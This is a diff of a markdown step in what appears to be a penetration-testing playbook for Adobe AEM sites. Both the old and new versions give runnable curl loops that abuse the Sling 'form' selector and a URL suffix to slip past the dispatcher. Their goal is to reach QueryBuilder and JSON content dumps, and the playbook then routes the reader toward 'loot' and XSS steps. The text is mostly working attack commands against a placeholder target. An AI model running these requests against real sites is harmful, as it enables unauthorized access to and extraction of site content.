@@ -1,82 +1,77 @@
-# Batch 06 — Dispatcher bypass: `form` selector + suffix
+# Batch 06 — Trick the bouncer (`form` + secret path after)
 
-## objective
+## GOAL
+Use `.form.css/` (or `.js`/`.png`) so the **real path rides after** as a suffix.
 
-Use the Sling **`form` selector** so the **suffix** becomes the real path inside AEM, while the dispatcher only “sees” a friendly prefix + extension (css/js/png).
+## TIME
+~1 hour
 
-## estimated_time
+## YOU NEED
+- `PAGE` from batch 01
 
-45–75 minutes
+---
 
-## prerequisites
+## WHY (30 seconds)
 
-- `PAGE` from batch 01 (any public page path)
-- Prefer after 04–05 failed, or as extra path
+AEM URLs can be:
 
-## testing_workflow
+```text
+/normal/page.form.css/REAL/PATH/HERE
+         \selector/ \ext/ \___suffix___/
+```
 
-### 1) Technique A — QueryBuilder via suffix
+Guard looks at the front: “page + css, fine.”  
+App may treat the **suffix** as the real place to go (e.g. QueryBuilder).  
+That is a built-in “cheat code” selector named `form` (often patched — still try).
+
+---
+
+## DO THIS
 
 ```bash
-T="https://TARGET"
+T="https://PUT-THE-SITE-HERE"
 PAGE="/content/YOUR/PAGE"
+```
 
-for ext in css js png jpg html; do
+### 1) QueryBuilder via suffix
+
+```bash
+for ext in css js png html; do
   u="${PAGE}.form.${ext}/bin/querybuilder.json?path=/content&p.limit=3"
   code=$(curl -sk -o /tmp/qb.out -w "%{http_code}" "$T$u")
-  size=$(wc -c </tmp/qb.out)
-  echo "$code $size  $u"
-  grep -qE 'hits|success' /tmp/qb.out && head -c 220 /tmp/qb.out && echo
+  echo "$code  $u"
+  grep -qE 'hits|success' /tmp/qb.out && echo ">>> OPEN" && head -c 200 /tmp/qb.out && echo
 done
 ```
 
-Also try a DAM root:
+### 2) Also try DAM root
 
 ```bash
-curl -sk -o /tmp/qb.out -w "%{http_code} size=%{size_download}\n" \
+curl -sk -o /tmp/qb.out -w "%{http_code} bytes=%{size_download}\n" \
   "$T/content/dam.form.js/bin/querybuilder.json?path=/&p.limit=3"
 head -c 300 /tmp/qb.out; echo
 ```
 
-### 2) Technique B — JSON dump via suffix
+### 3) Dump JSON via suffix
 
 ```bash
-curl -sk -o /tmp/n.json -w "%{http_code} size=%{size_download}\n" \
+curl -sk -o /tmp/n.json -w "%{http_code} bytes=%{size_download}\n" \
   "$T${PAGE}.form.png/content.3.json"
-head -c 300 /tmp/n.json; echo
-
-curl -sk -o /tmp/n.json -w "%{http_code} size=%{size_download}\n" \
-  "$T${PAGE}.form.css/etc.1.json"
-head -c 300 /tmp/n.json; echo
+head -c 250 /tmp/n.json; echo
 ```
 
-### 3) Technique C — note patched vs open
+---
 
-If all 404/empty: likely patched (CVE-2024-26029 era) or selector blocked.  
-Record attempts; do not burn an hour retrying random pages beyond 2–3 `PAGE`s.
+## IF / THEN
 
-```bash
-# Second page only if first failed
-PAGE2="/content/OTHER/PAGE"
-curl -sk -o /tmp/qb.out -w "%{http_code}\n" \
-  "$T${PAGE2}.form.css/bin/querybuilder.json?path=/content&p.limit=2"
-```
+| What you saw | What you do |
+|--------------|-------------|
+| OPEN / hits / fat JSON | Save URL → **07** |
+| All dead after 04+05+06 | Skip loot door for now → **09** (XSS track) |
+| Forms=yes from 01 | After 09–11 or next day → **12** |
 
-## decision_points
+---
 
-| If… | Then… |
-|-----|--------|
-| QueryBuilder or `.json` dump works | Save URL → **07** (and later **11** for chains) |
-| form works but QB ACL empty | Try dumps of `/content` only; still go **07** lightly / **08** |
-| Total failure after 04–06 | Proceed to **09** selector XSS + **12** Forms; loot may be dead on publish |
-
-## expected_findings
-
-- Dispatcher bypass via suffix forward  
-- Access to `/bin/*` or `.json` trees previously 404
-
-## next_batch_to_continue_with
-
-- Any data access → **[07-loot-querybuilder.md](./07-loot-querybuilder.md)**  
-- No data access at all → **[09-xss-rawcontent.md](./09-xss-rawcontent.md)** (pivot to XSS track)  
-  (Still schedule **12** if Forms flagged in batch 01)
+## NEXT
+- Win → [07-loot-querybuilder.md](./07-loot-querybuilder.md)  
+- No data door → [09-xss-rawcontent.md](./09-xss-rawcontent.md)
